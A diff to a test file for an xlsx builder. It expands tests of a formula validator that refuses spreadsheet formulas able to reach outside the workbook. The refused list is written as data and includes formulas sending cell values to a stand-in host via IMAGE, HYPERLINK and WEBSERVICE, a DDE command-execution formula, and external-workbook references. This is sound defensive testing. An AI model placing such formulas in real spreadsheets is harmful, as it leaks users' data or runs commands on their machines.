@@ -213,15 +213,31 @@ describe("make_xlsx", () => {
 		expect(() => dateSerial("2026-02-30")).toThrow(/calendar/);
 	});
 
-	test("formulas that reach outside the workbook are refused", () => {
+	test("formulas may call only local functions; anything that can reach out is refused", () => {
 		expect(checkFormula("=SUM(A1:A3)")).toBe("SUM(A1:A3)");
 		expect(checkFormula('=IF(A1="[x]|y","a","b")')).toBe('IF(A1="[x]|y","a","b")');
-		expect(() => checkFormula('=WEBSERVICE("http://x")')).toThrow(/outside/);
-		expect(() => checkFormula("=[Other.xlsx]Sheet1!A1")).toThrow(/another workbook/);
-		expect(() => checkFormula("=cmd|' /C calc'!A0")).toThrow(/DDE/);
-		expect(() => buildXlsx({ sheets: [{ name: "S", rows: [[{ formula: "=CALL(1)" }]] }] })).toThrow(
-			/cell A1/,
-		);
+		expect(checkFormula("=IFERROR(VLOOKUP(A2,'Q1 (draft)'!A:B,2,FALSE),0)")).toContain("VLOOKUP");
+		expect(checkFormula("=round(log10(B2), 2)")).toBe("round(log10(B2), 2)");
+		const refused: Array<[string, RegExp]> = [
+			['=IMAGE("https://x.example/p.png?d="&A1)', /IMAGE/],
+			['=HYPERLINK("https://x.example/?d="&A1,"open")', /HYPERLINK/],
+			['=STOCKHISTORY("MSFT",TODAY())', /STOCKHISTORY/],
+			['=WEBSERVICE("https://x.example/?d="&A1)', /WEBSERVICE/],
+			['=FILTERXML(WEBSERVICE("https://x.example"),"//a")', /FILTERXML/],
+			['=RTD("srv",,"topic")', /RTD/],
+			['=INDIRECT("[x.xlsx]S!A1")', /INDIRECT/],
+			['=OFFSET(INDIRECT("[x.xlsx]S!A1"),0,0)', /INDIRECT/],
+			['=_xlfn.IMAGE("https://x.example")', /_XLFN\.IMAGE/],
+			['=CELL("filename")', /CELL/],
+			["=CALL(1)", /CALL/],
+			["=[Other.xlsx]Sheet1!A1", /another workbook/],
+			["='C:\\tmp\\[Other.xlsx]Sheet1'!A1", /another workbook/],
+			["=cmd|' /C calc'!A0", /DDE/],
+		];
+		for (const [f, why] of refused) expect(() => checkFormula(f), f).toThrow(why);
+		expect(() =>
+			buildXlsx({ sheets: [{ name: "S", rows: [[{ formula: '=IMAGE("https://x")' }]] }] }),
+		).toThrow(/cell A1/);
 	});
 
 	test("bad sheet names, duplicates and bad dates are refused", () => {
